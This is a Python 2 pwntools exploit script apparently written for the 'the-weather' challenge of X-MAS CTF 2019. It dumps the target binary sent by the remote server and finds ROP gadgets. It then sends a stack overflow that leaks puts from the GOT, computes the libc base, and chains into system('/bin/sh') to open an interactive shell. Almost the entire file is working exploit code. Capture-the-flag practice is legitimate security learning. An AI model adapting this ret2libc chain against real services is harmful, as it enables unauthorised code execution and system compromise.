#!/usr/bin/env python2

import sys
from pwn import *
import base64
from os import system
from ropper import RopperService
from elftools.elf.elffile import ELFFile
from capstone import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/xmas-htsp-2019/pwn/the-weather/tmp/ok")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def dump_elf(binary,path):
    raw_bin = base64.b64decode(binary)
    f = open(path,'wb')
    f.write(raw_bin)
    f.close()
    system("chmod 777 tmp/ok")
    log.info("data saved at " + path)
    return path

def getting_text_segment(filename):
    print 'Processing file: '+ filename
    # with open(filename, 'rb') as f:
    #     elffile = ELFFile(f)
    elffile = ELFFile(open(filename,"rb"))
    for section in elffile.iter_sections():
        if section.name == ".text":
            text = hex(section['sh_addr'])
        log.info(hex(section['sh_addr']) + " " + section.name)
    return text

def exploit(r):
    # attach(r)
    # off = 424

    path = "tmp/ok"
    # dumping elf to a file

    if sys.argv[1] == "remote":
        r.recvuntil("Content: b'")
        binary = r.recvline()
        dump = dump_elf(binary,path)
        binf = ELF(dump)
    else:
        binf = elf

    puts_got = binf.got['puts']
    puts_plt = binf.plt['puts']


    rop = ROP(path)
    pop_rdi     = rop.find_gadget(["pop rdi","ret"])[0]
    ret         = rop.find_gadget(["ret"])[0]
    leave_ret   = rop.find_gadget(["leave"]) [0]
    log.info("pop rdi; ret : " + hex(pop_rdi))
    log.info("ret          : " + hex(ret))
    log.info("leave ;ret   : " + hex(leave_ret))

    off = int(raw_input("input offset2rip : "))
    # off = 392
    # main = int(raw_input("input main : ").replace(".text:",""),16)

    text_segment = int(getting_text_segment(path),16)

    getsPlt = elf.plt['gets']
    bss     = elf.bss(500)

    # off = 245
    log.info("offset2rip   : " + str(off))
    # log.info("main         : " + hex(main))
    log.info("bss          : " + hex(bss))
    log.info("gets         : " + hex(getsPlt))
    log.info(".text segment: " + hex(text_segment))

    p = "A" * off
    p += p64(pop_rdi)
    p += p64(puts_got)
    # p += p64(pop_rdi)
    # p += p64(bss)
    # p += p64(getsPlt)
    # p += p64(leave_ret)
    p += p64(ret)
    p += p64(puts_plt)
    p += p64(text_segment)
    # p += p64(main)

    r.sendlineafter("? ",p)


    r.recvuntil("!\n")
    r.recvuntil("!\n")
    # leak = r.recv()
    leak = u64(r.recv(8).split()[0].ljust(8,'\x00'))
    log.info("leak puts : " + hex(leak))
    # #
    # # log.info("leak puts : " + hex(leak))
    # #
    libc_base = leak - libc.symbols['puts']
    systemlibc = libc_base + libc.symbols['system']
    binsh = libc_base + libc.search("/bin/sh").next()
    log.info("libc base   : " + hex(libc_base))
    log.info("system@libc : " + hex(systemlibc))
    log.info("/bin/sh     : " + hex(binsh))

    q = "A" * off
    q += p64(pop_rdi)
    q += p64(binsh)
    q += p64(ret)
    q += p64(systemlibc)

    r.sendline(q)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("challs.xmas.htsp.ro", 12002)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
